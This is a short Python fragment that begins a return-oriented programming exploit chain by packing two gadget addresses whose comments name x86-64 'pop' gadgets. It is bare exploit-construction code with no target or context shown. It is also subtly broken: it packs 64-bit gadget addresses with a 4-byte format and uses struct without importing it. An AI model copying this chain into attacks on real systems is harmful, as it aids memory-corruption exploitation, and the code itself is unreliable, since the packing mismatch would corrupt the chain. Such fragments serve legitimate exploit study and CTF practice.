p = ""
p += struct.pack("<I", 0x8e0)  # pop r14; pop r15; ret; 
p += struct.pack("<I", 0x8e1)  # pop rsi; pop r15; ret; 
